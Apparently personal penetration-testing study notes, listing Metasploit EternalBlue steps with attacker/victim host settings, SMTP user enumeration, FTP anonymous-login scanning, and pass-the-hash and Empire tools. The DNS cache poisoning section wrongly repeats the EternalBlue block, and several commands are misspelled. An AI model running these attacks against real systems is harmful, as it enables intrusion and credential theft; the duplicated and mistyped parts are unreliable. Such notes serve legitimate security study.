<h5><em>Update: Aug-2022</em></h5>

<h2> NetBIOS and SM Enumeration</h2>

<h4>1. NetBIOS</h4>

-   Used befor Windows 7
-   NetBIOS Name Service (NetBIOS-NS): UDP 137
-   16-character name assigned to a computer in a workgroup by WINS for name resolution of an IP address to NetBIOS name (Now uses DNS for name resolution)
-   NetBIOS Datagram Service (NetBIOS-DGM): UDP 138
-   NetBIOS Session service (NetBIOS-SSN): TCP 139
-   SMB protocol: TCP 445
-   Microsoft Remopte Procedure Call (RPC): TCP135

```sh
# PowerShell
nbtstat -a <host-address>
# Bash
nbtscan

```

<h4>2.  Server Message Block (SMB) exploit</h4>

-   [Exploit Database](https://www.exploit-db.com/)

```sh
# Bash
sudo searchexploit smb

# Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOST <host-address>
set LHOST <host-address>
exploit

```

-   [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue)
    -   SMB exploit tool leaked from U.S. NSA
    -   EternalBlue on Metasploit

```sh
sudo service postgresql start
msfconsole
> show options
> search Eternal
> use exploit/windows/smb/ms17-010_eternalblue
# set remote host (victiom): SMB server
> set RHOST xxx.xxx.xxx.xxx
# set local host (attacker)
> set LHOST xxx.xxx.xxx.xxx
> exploit

```

<h4>3. DNS Cache poisoning</h4>

```sh
sudo service postgresql start
msfconsole
> show options
> search Eternal
> use exploit/windows/smb/ms17-010_eternalblue
# set remote host (victiom): SMB server
> set RHOST xxx.xxx.xxx.xxx
# set local host (attacker)
> set LHOST xxx.xxx.xxx.xxx
> exploit

```

<h4>4. SNMP Exploits</h4>

```sh
ls -l /usr/share/nmap/scripts smp*


```

<h4>5. SMTP Exploits</h4>

-   SMTP open relay
    -   An email server accepts and relays (sends) emails from any user
    -   It is possible to send spoofed emails, spam, phishing, and other email-related scams

```sh
namp --script smtp-open-relay.nse

# SMTP commands
telnet xx.xx.xx.xx
smtp-user-enum

smtp-user-enum -M VRFY -U users.txt -t xx.xx.xx.xx
smtp-user-enum -M EXPN -U admin1 -t xx.xx.xx.xx
smtp-user-enum -M RCPT -U users.txt -T mail-ser-ips.txt
smtp-user-enum -M EXPN -D example.com -t xx.xx.xx.xx

searchsploit smtp

```

<h4>6. FTP Exploits</h4>

-   Use SFTP (FTP with SSH) or FTPS (FTP over TLS)
    -   DES, BlowFish, MD5, SHA-1: weak encryption/hash
    -   SHA-2 family (SHA-2, SHA-512) recommended

```sh

# port scan: prot number/service only
nmap xx.xx.xx.xx
# port scan: prot number/service + service daemon info. + OS
nmap -sV xx.xx.xx

# open Metasploit
sudo msfconsole
# FTP anonymous login verification using Metasploit
> use auxiliary/scanner/ftp anonymous
> set RHOST xx.xx.xx.xx
> exploit

```

<h4>7. Pass-the-Hash Attacks</h4>

-   MS Windows: Security Account Manager (SAM)

    -   Saved in "C:\Windows\System32\config"
    -   NTLM (New Technology LAN Manager)
    -   [<u>"Cain and Abel"</u>](<https://en.wikipedia.org/wiki/Cain_and_Abel_(software)>) (Windows-version only password recovery tool + ...)
    -   [<u>"Ophcrack"</u>](https://ophcrack.sourceforge.io/): free windows password cracker based on rainbow tables
    -   [<u>"John The Ripper"</u>](https://github.com/openwall/john): open-source password security auditing and password recovery tool

-   [Mimikatz](https://github.com/ParrotSec/mimikatz)
    -   Retrieve password hashes from memory
    -   Metasploit/Mimikatz integration tutorial: https://www.offensive-security.com/metasploit-unleashed/mimikatz/

```sh
# try
id
ip address show

# John the Ripper
john --help

# mimikatz
sudo su

msfconsole
> search exploits
# find usable meterpreter exploits, and set connection to victiom
> use exploit-name
> search options
> set option-id option-valeu
> exploit

```

<h4>8. Kerberos and LDAP-base Attacks</h4>

-   Kerberos
    -   Federated authentication protocol defined in RFC4120
    -   Refer to [MIT Kerberos Consortium](https://www.kerberos.org/)
-   Windows AD employs LDAP as an access protocol

<h5>8-1. Golden ticket attackKerberos and LDAP-base Attacks</h5>

-   Refer to [Empire Github](https://github.com/EmpireProject/Empire)

```sh

# Empire setup (Need verified)
# cd directory-to-be-installed
# git clone https://github.com/EmpireProject/Empire
# cd Empire/setup
# ./install.sh
# cd ..
# ./empire

# powershell-empire tool
powershell-empire -h

```
